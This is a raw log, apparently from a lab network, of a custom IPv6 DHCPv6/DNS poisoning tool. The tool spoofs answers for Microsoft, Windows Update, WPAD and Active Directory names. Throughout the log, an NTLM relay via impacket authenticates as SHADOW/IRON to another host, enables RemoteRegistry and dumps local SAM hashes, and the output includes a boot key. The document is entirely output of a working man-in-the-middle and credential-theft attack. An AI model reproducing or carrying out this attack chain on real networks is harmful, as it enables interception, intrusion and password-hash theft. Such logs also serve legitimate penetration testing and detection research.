+2022-01-19 17:01:43.332 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.SHADOW.local.'[0m
+2022-01-19 17:01:44.245 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:44.246 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:44.246 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:44.300 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:44.300 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:44.300 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:01:45.035 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:45.036 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:45.036 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:45.076 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:46.960 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:46.960 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:46.960 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wdcpalt.microsoft.com.'[0m
+2022-01-19 17:01:47.203 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:47.203 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:47.204 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:47.256 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:47.940 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:47.940 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:47.940 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'api.msn.com.'[0m
+2022-01-19 17:01:49.327 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:49.328 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:49.328 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:49.368 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:49.492 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:49.493 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:49.493 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'tile-service.weather.microsoft.com.'[0m
+2022-01-19 17:01:49.539 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:49.540 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:49.540 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'cdn.onenote.net.'[0m
+2022-01-19 17:01:50.878 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:50.878 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:50.878 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'www.bing.com.'[0m
+2022-01-19 17:01:51.346 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:01:51.346 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:01:51.346 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'login.live.com.'[0m
+2022-01-19 17:01:51.443 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:51.443 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:51.443 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:51.480 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:53.547 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:53.547 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:53.548 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:53.602 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:55.691 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:55.691 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:55.691 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:55.731 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:57.827 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:57.827 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:57.827 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:57.864 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:59.951 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:01:59.951 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:01:59.951 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:01:59.999 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:00.005 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:00.005 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:00.006 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'download.windowsupdate.com.'[0m
+2022-01-19 17:02:01.468 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:01.469 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:01.469 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'holaaaaaaaaaaaaaaa.SHADOW.local.'[0m
+2022-01-19 17:02:02.083 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:02.083 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:02.083 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:02.144 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:04.231 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:04.232 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:04.233 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:04.286 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:04.892 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:04.892 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:04.892 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'slscr.update.microsoft.com.'[0m
+2022-01-19 17:02:06.367 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:06.368 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:06.368 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:173 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:06.420 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:06.910 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:06.911 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:06.913 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'checkappexec.microsoft.com.'[0m
+2022-01-19 17:02:07.673 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:07.674 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:07.674 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'g.live.com.'[0m
+2022-01-19 17:02:07.732 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:07.732 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:07.732 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'config.teams.microsoft.com.'[0m
+2022-01-19 17:02:08.491 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:08.491 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:08.491 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:08.532 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:10.075 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:10.075 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:10.075 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wpad.SHADOW.local.'[0m
+2022-01-19 17:02:10.152 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:10.152 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:10.152 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'config.edge.skype.com.'[0m
+2022-01-19 17:02:10.675 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:10.675 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:10.675 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:10.688 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:10.688 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:10.688 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'login.microsoftonline.com.'[0m
+2022-01-19 17:02:10.712 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:10.990 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:10.991 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:10.991 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'edge.microsoft.com.'[0m
+2022-01-19 17:02:12.381 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:12.381 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:12.382 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'nav.smartscreen.microsoft.com.'[0m
+2022-01-19 17:02:12.711 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-19 17:02:12.803 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:12.803 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:12.803 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:12.808 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-19 17:02:12.820 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, but there are no more targets left!
+2022-01-19 17:02:12.847 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:12.873 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2022-01-19 17:02:12.884 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2022-01-19 17:02:12.891 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2022-01-19 17:02:14.121 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2022-01-19 17:02:14.296 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2022-01-19 17:02:14.908 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2022-01-19 17:02:14.922 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2022-01-19 17:02:14.927 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:14.927 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:14.927 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:14.929 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2022-01-19 17:02:14.965 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:147 - [36m(DHCP6)Capturing REQUEST packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:17.047 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:169 - Packet crafted: 
+2022-01-19 17:02:17.047 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:170 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::ad5d:a0a0:f1d:bb1d:dhcpv6_client / DHCP6_Reply / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2022-01-19 17:02:17.047 | DEBUG    | project.network.poison.poisonengine.poisoners.dhcp6:__send_packet:178 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:02:21.577 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:21.578 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:21.578 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'fe3cr.delivery.mp.microsoft.com.'[0m
+2022-01-19 17:02:21.620 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:21.620 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:21.620 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'fe3cr.delivery.mp.microsoft.com.'[0m
+2022-01-19 17:02:23.777 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:23.777 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:23.777 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'15.89.54.20.in-addr.arpa.'[0m
+2022-01-19 17:02:24.549 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:24.550 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:24.550 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'slscr.update.microsoft.com.'[0m
+2022-01-19 17:02:26.613 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:26.613 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:26.613 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'226.101.242.52.in-addr.arpa.'[0m
+2022-01-19 17:02:30.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:30.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
